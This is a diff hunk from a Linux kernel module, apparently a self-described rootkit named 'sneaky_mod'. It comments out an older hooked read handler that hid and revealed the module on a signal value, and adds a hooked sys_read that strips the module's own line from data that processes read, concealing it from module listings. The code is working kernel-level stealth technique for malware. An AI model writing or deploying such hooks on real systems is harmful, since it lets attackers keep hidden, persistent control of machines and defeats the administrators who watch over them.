@@ -104,24 +104,42 @@ void showme(void) {
     list_add(&THIS_MODULE->list, prev_module);
 }
 
+// asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
+//     static short hidden = 0;
+
+//     void showme(void);
+//     void hideme(void);
+
+//     int sig = regs->si;
+
+//     if ((sig == 64) && (hidden == 0)) {
+//         printk(KERN_INFO "rootkit: hiding rootkit!\n");
+//         hideme();
+//         hidden = 1;
+//     } else if ((sig == 64) && (hidden == 1)) {
+//         printk(KERN_INFO "rootkit: revealing rootkit!\n");
+//         showme();
+//         hidden = 0;
+//     } else {
+//         return original_read(regs);
+//     }
+//     return original_read(regs);
+// }
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
-    static short hidden = 0;
-
-    void showme(void);
-    void hideme(void);
-
-    int sig = regs->si;
-
-    if ((sig == 64) && (hidden == 0)) {
-        printk(KERN_INFO "rootkit: hiding rootkit!\n");
-        hideme();
-        hidden = 1;
-    } else if ((sig == 64) && (hidden == 1)) {
-        printk(KERN_INFO "rootkit: revealing rootkit!\n");
-        showme();
-        hidden = 0;
-    } else
-        return original_read(regs);
+    ssize_t nread = original_read(regs);
+    void *buf = (void *)regs->si;
+    if (nread > 0) {
+        void *start = strnstr(buf, "sneaky_mod ", nread);
+        if (start) {
+            void *end = strnstr(start, "\n", nread - (start - buf));
+            if (end) {
+                int length = end - start + 1;
+                memmove(start, end + 1, nread - (start - buf) - length);
+                nread -= length;
+            }
+        }
+    }
+    return nread;
 }
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void) {
